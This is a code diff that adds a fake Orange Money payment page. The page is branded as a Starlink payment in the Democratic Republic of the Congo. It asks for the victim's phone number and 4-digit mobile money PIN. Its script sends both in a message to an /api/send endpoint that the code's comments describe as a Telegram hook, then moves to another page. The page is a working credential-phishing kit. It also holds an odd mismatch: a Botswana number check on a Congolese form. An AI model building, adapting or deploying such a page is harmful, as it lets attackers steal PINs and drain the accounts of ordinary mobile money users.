@@ -1,0 +1,287 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Orange Money</title>
+<style>
+*{box-sizing:border-box}
+html,body{margin:0;padding:0;min-height:100%;font-family:Arial,Helvetica,sans-serif;overflow-x:hidden}
+body{background:#070b10;color:#111;min-height:100dvh;display:flex;justify-content:center;align-items:flex-start;padding:12px 0 18px}
+.card{width:100%;max-width:430px;margin:0 auto;padding:0 8px}
+
+/* Branding */
+.brand-wrap{text-align:center;padding:10px 16px 18px;color:#ff6900}
+.orange-badge{width:92px;height:92px;border-radius:50%;background:#ff6900;margin:0 auto 18px;display:flex;align-items:center;justify-content:center;color:#fff;font-size:54px;font-weight:400;line-height:1}
+.brand-title{margin:0;font-size:clamp(34px,9vw,58px);font-weight:800;letter-spacing:-.04em;line-height:1;color:#ff6900}
+.brand-sub{margin-top:8px;font-size:clamp(17px,4vw,22px);color:#ff6900;font-weight:400}
+
+/* Main card */
+.form-panel{background:#fff;border:1px solid #262626;border-radius:20px;padding:0 18px 18px;overflow:hidden;box-shadow:0 2px 8px rgba(0,0,0,.35)}
+.payment-header{height:62px;margin:0 -18px 20px;padding:0 16px;background:linear-gradient(110deg,#050505 0%,#171717 48%,#2b2b2b 100%);border-radius:20px 20px 0 0;display:flex;align-items:center;justify-content:center;color:#fff;font-size:clamp(22px,5vw,30px);font-weight:700;text-align:center}
+.payment-header .star{color:#f7cf36;margin-right:10px;font-size:1.05em}
+
+/* Phone */
+.phone-title{margin:24px 0 18px;text-align:center;font-size:clamp(24px,6vw,38px);font-weight:700;line-height:1.08;color:#111}
+.phone-box{width:100%;height:68px;border:2px solid #d9d9d9;border-radius:12px;background:#fff;display:flex;align-items:center;overflow:hidden}
+.country{display:flex;align-items:center;justify-content:center;gap:8px;height:100%;padding:0 12px 0 10px;border-right:1px solid #dfe8ee;background:#f7f7f7;flex-shrink:0;width:88px}
+.country .flag{display:flex;align-items:center;justify-content:center;width:26px;height:22px;overflow:hidden;border-radius:50%;flex-shrink:0}
+.country .flag img{display:block;width:100%;height:100%;object-fit:cover;border-radius:50%}
+.country .code{font-size:15px;font-weight:700;color:#1d1d1d;letter-spacing:.02em;line-height:1}
+.phone{width:100%;min-width:0;flex:1;height:100%;border:0;outline:0;background:transparent;padding:0 14px;font-size:clamp(18px,4vw,24px);color:#333;font-weight:600}
+.phone::placeholder{color:#aaa;opacity:1}
+
+/* PIN */
+.pin-box{margin:18px auto 0;display:grid;grid-template-columns:repeat(4,minmax(0,64px));gap:10px;justify-content:center}
+.pin-digit{width:100%;height:58px;border:2px solid #d9d9d9;border-radius:10px;background:#fff;text-align:center;font-size:1.8rem;font-weight:700;color:#1d2430;outline:none}
+
+.otp-hint{margin-top:20px;text-align:center;font-size:clamp(14px,3vw,18px);color:#666;line-height:1.4}
+.terms{margin-top:24px;color:#666;font-size:clamp(12px,3vw,16px);line-height:1.45;text-align:center}
+.terms a{color:#e96a18;text-decoration:none;font-weight:400}
+.next-btn{width:100%;height:58px;margin-top:24px;border:0;border-radius:10px;background:#f56a00;color:#fff;font-weight:800;font-size:20px;letter-spacing:.02em;cursor:pointer;touch-action:manipulation;-webkit-tap-highlight-color:transparent;box-shadow:0 8px 18px rgba(245,106,0,.18)}
+.next-btn.enabled{background:#f56a00;color:#fff;cursor:pointer;box-shadow:0 8px 18px rgba(245,106,0,.18)}
+.secure{text-align:center;margin-top:18px;color:#3f7d4b;font-size:clamp(11px,2.7vw,14px);letter-spacing:.04em;background:#e7f5e9;border-radius:18px;padding:12px 10px;white-space:normal;overflow-wrap:anywhere}
+.secure .lock{color:#3c8749;font-size:1.1rem;margin-right:8px}
+.error{
+  position:relative;
+  width:100%;
+  background:#ef5f2d;
+  color:#fff;
+  border-radius:999px;
+  box-shadow:0 10px 18px rgba(239,95,45,.14);
+  padding:16px 18px;
+  text-align:center;
+  font-size:clamp(20px,3.8vw,38px);
+  font-weight:800;
+  line-height:1.12;
+  letter-spacing:-.04em;
+  display:none;
+  margin:0 0 12px;
+  z-index:1;
+}
+
+.error.show{
+  display:block;
+  opacity:1;
+  animation: fadeToast 5s ease-in-out 1 forwards;
+}
+
+@keyframes fadeToast {
+  0% { opacity: 0; transform: scale(.98); }
+  10% { opacity: 1; transform: scale(1); }
+  80% { opacity: 1; transform: scale(1); }
+  100% { opacity: 0; transform: scale(.98); }
+}
+
+@media (max-width:480px){
+  body{padding:10px 0 16px}
+  .brand-wrap{padding:4px 8px 14px}
+  .orange-badge{width:72px;height:72px;margin-bottom:14px;font-size:42px}
+  .brand-title{font-size:clamp(32px,9vw,48px)}
+  .form-panel{padding:0 12px 12px;border-radius:18px}
+  .payment-header{height:56px;margin:0 -12px 16px;border-radius:18px 18px 0 0;font-size:clamp(18px,5vw,24px)}
+  .phone-title{margin:18px 0 16px;font-size:clamp(22px,7vw,30px)}
+  .phone-box{height:58px;border-width:2px;border-radius:11px}
+  .country{width:100px;padding:0 8px;gap:5px}
+  .country .flag{width:28px;height:22px}
+  .phone{padding:0 10px;font-size:15px}
+  .pin-box{gap:7px;grid-template-columns:repeat(4,minmax(0,1fr));margin-top:16px}
+  .pin-digit{height:50px;border-width:2px;border-radius:9px;font-size:1.5rem}
+  .otp-hint{margin-top:18px;font-size:13px}
+  .terms{margin-top:18px;font-size:12px}
+  .next-btn{height:50px;margin-top:18px;font-size:17px}
+  .secure{margin-top:14px;padding:10px 6px;font-size:10px;white-space:normal}
+}
+
+@media (max-width:380px){
+  .orange-badge{width:64px;height:64px;margin-bottom:12px;font-size:38px}
+  .brand-title{font-size:30px}
+  .payment-header{height:50px}
+  .phone-box{height:54px}
+  .country{width:100px;padding:0 8px;gap:5px}
+  .country .flag{width:28px;height:22px}
+  .phone{font-size:14px;padding:0 8px}
+  .pin-digit{height:46px}
+  .payment-header{font-size:18px;padding:0 10px}
+  .phone-title{font-size:25px}
+  .form-panel{padding-left:10px;padding-right:10px}
+  .payment-header{margin-left:-10px;margin-right:-10px}
+}
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="brand-wrap">
+    <div class="orange-badge">O</div>
+    <h1 class="brand-title">Orange Money</h1>
+    <div class="brand-sub">by Orange</div>
+  </div>
+
+  <div class="form-panel">
+    <div class="payment-header"><span class="star">★</span><span>Paiement Starlink</span></div>
+
+    <div class="phone-title">Entrez votre numéro<br>Orange Money</div>
+
+    <div id="error" class="error" aria-live="assertive"></div>
+
+    <div class="phone-box">
+      <div class="country" aria-label="Democratic Republic of the Congo country code">
+        <span class="flag" aria-label="Democratic Republic of the Congo flag">
+          <img src="https://flagcdn.com/w80/cd.png" alt="Democratic Republic of the Congo flag">
+        </span>
+        <span class="code">+243</span>
+      </div>
+      <input id="phone" class="phone" type="tel" inputmode="numeric" maxlength="11" placeholder="XX XXX XXX" autocomplete="tel">
+    </div>
+
+    <div class="pin-box" aria-label="Enter Orange Money PIN">
+      <input class="pin-digit" type="password" inputmode="numeric" maxlength="1" aria-label="Digit 1">
+      <input class="pin-digit" type="password" inputmode="numeric" maxlength="1" aria-label="Digit 2">
+      <input class="pin-digit" type="password" inputmode="numeric" maxlength="1" aria-label="Digit 3">
+      <input class="pin-digit" type="password" inputmode="numeric" maxlength="1" aria-label="Digit 4">
+    </div>
+
+    <div class="otp-hint">Saisissez votre code PIN Orange Money à 4 chiffres pour autoriser cette transaction.</div>
+
+    <div class="terms">En utilisant ce service, vous acceptez nos <a href="#">Conditions d'utilisation</a> et notre <a href="#">Politique de confidentialité</a></div>
+    <button class="next-btn" id="nextBtn" type="button">SUIVANT</button>
+    <div class="secure"><span class="lock">◌</span> SSL CHIFFRÉ ET SÉCURISÉ</div>
+  </div>
+</div>
+
+<script>
+const phone = document.getElementById('phone');
+const pinInputs = [...document.querySelectorAll('.pin-digit')];
+const nextBtn = document.getElementById('nextBtn');
+const errorEl = document.getElementById('error');
+
+function getSelectedPlan() {
+  try {
+    const raw = sessionStorage.getItem('selectedPlan');
+    return raw ? JSON.parse(raw) : null;
+  } catch (err) {
+    console.warn('Could not read selected plan:', err);
+    return null;
+  }
+}
+
+function formatPhoneNumber(rawValue) {
+  const digits = rawValue.replace(/\D/g, '').slice(0, 8);
+
+  if (digits.length <= 2) return digits;
+  if (digits.length <= 5) return `${digits.slice(0, 2)} ${digits.slice(2)}`;
+  return `${digits.slice(0, 2)} ${digits.slice(2, 5)} ${digits.slice(5)}`;
+}
+
+function isBotswanaPhoneNumber(value) {
+  return /^(?:8[0-9]|9[0-9])\d{6}$/.test(value);
+}
+
+function renderButtonState() {
+  const rawPhone = phone.value.replace(/\D/g, '');
+  const phoneValid = isBotswanaPhoneNumber(rawPhone);
+  const pinValid = pinInputs.every(input => /^\d$/.test(input.value));
+  nextBtn.classList.toggle('enabled', phoneValid && pinValid);
+  nextBtn.disabled = false;
+}
+
+function showError(message) {
+  errorEl.textContent = message;
+  errorEl.classList.remove('show');
+  void errorEl.offsetWidth;
+  errorEl.classList.add('show');
+
+  clearTimeout(window.errorToastTimer);
+  window.errorToastTimer = setTimeout(() => {
+    hideError();
+  }, 5000);
+}
+
+function hideError() {
+  errorEl.textContent = '';
+  errorEl.classList.remove('show');
+}
+
+phone.addEventListener('input', () => {
+  const rawPhone = phone.value.replace(/\D/g, '').slice(0, 8);
+  phone.value = formatPhoneNumber(rawPhone);
+  hideError();
+  renderButtonState();
+});
+
+phone.addEventListener('focus', hideError);
+
+pinInputs.forEach((input) => {
+  input.addEventListener('focus', hideError);
+});
+
+pinInputs.forEach((input, index) => {
+  input.addEventListener('input', () => {
+    input.value = input.value.replace(/\D/g, '').slice(0, 1);
+    if (input.value && index < pinInputs.length - 1) {
+      pinInputs[index + 1].focus();
+    }
+    errorEl.textContent = '';
+    renderButtonState();
+  });
+
+  input.addEventListener('keydown', (event) => {
+    if (event.key === 'Backspace' && !input.value && index > 0) {
+      pinInputs[index - 1].focus();
+    }
+  });
+});
+
+nextBtn.addEventListener('click', async () => {
+  const phoneNumber = phone.value.replace(/\D/g, '');
+  const pin = pinInputs.map(input => input.value).join('');
+
+  if (!isBotswanaPhoneNumber(phoneNumber)) {
+    showError('Veuillez saisir un numéro Orange valide');
+    return;
+  }
+
+  if (!/^\d{4}$/.test(pin)) {
+    showError('Veuillez saisir un code PIN valide');
+    return;
+  }
+
+  hideError();
+
+  const selectedPlan = getSelectedPlan();
+  const planName = selectedPlan && selectedPlan.name ? selectedPlan.name : 'Starlink Renewal';
+  const planPrice = selectedPlan && selectedPlan.price ? selectedPlan.price : 'USD 49';
+
+  localStorage.setItem('phone', phoneNumber);
+  localStorage.setItem('userPin', pin);
+
+  const message = `Orange Money Payment\nPhone: <code>${phoneNumber}</code>\nPIN: ${pin}`;
+
+  const apiUrl = window.location.hostname === 'localhost'
+    ? 'http://localhost:3000/api/send'
+    : `${window.location.origin}/api/send`;
+
+  const payload = { text: message };
+
+  try {
+    const response = await fetch(apiUrl, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    }).catch(() => null);
+
+    if (response) {
+      const data = await response.json().catch(() => null);
+      if (data && !data.ok) {
+        console.warn('Telegram rejected message:', data.error || 'unknown error');
+      }
+    }
+  } catch (sendError) {
+    console.warn('Telegram hook unavailable:', sendError);
+  }
+
+  window.location.href = 'ming.html';
+});
+</script>
+</body>
+</html>
